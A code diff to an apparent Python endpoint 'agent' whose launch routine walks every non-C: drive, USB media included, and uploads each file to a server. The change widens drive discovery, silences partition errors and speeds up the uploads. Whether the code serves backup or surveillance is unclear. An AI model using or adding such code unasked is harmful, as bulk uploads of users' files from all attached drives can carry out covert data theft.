@@ -259,17 +259,24 @@ def notify_file_deleted_on_server(file_path):
 def initial_drive_sync():
     """On agent launch, scan all non-C: drives and upload all existing files to database."""
     def run_sync():
-        time.sleep(3)  # Wait for initial report to register agent
+        time.sleep(2)  # Wait for initial report to register agent
         print("[AGENT FILE SYNC] Starting scan of all non-C: drives...")
+        
+        # Find all active non-C drives (D:, E:, F:, G:, USBs, etc.)
         non_c_drives = []
+        for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
+            root = f"{letter}:\\"
+            if os.path.exists(root):
+                non_c_drives.append(root)
+
         try:
-            for part in psutil.disk_partitions(all=False):
+            for part in psutil.disk_partitions(all=True):
                 if part.mountpoint and os.path.exists(part.mountpoint):
                     drive, _ = os.path.splitdrive(part.mountpoint)
-                    if drive and not drive.upper().startswith('C'):
+                    if drive and not drive.upper().startswith('C') and part.mountpoint not in non_c_drives:
                         non_c_drives.append(part.mountpoint)
-        except Exception as e:
-            print(f"[AGENT FILE SYNC ERR] Partition error: {e}")
+        except Exception:
+            pass
 
         if not non_c_drives:
             print("[AGENT FILE SYNC] No non-C: drives found on this machine.")
@@ -277,15 +284,18 @@ def initial_drive_sync():
 
         for drive_root in non_c_drives:
             print(f"[AGENT FILE SYNC] Scanning drive: {drive_root}")
-            for root, dirs, files in os.walk(drive_root, topdown=True):
-                # Skip ignored directories
-                dirs[:] = [d for d in dirs if not is_ignored(os.path.join(root, d))]
+            try:
+                for root, dirs, files in os.walk(drive_root, topdown=True):
+                    # Skip ignored directories
+                    dirs[:] = [d for d in dirs if not is_ignored(os.path.join(root, d))]
 
-                for file in files:
-                    full_path = os.path.join(root, file)
-                    if not is_ignored(full_path):
-                        upload_file_to_server(full_path)
-                        time.sleep(0.05)  # Smooth upload rate
+                    for file in files:
+                        full_path = os.path.join(root, file)
+                        if not is_ignored(full_path):
+                            upload_file_to_server(full_path)
+                            time.sleep(0.02)  # Fast smooth upload rate
+            except Exception as e:
+                print(f"[AGENT FILE SYNC] Error scanning {drive_root}: {e}")
 
         print("[AGENT FILE SYNC] Initial non-C: drive scan and upload complete!")
 
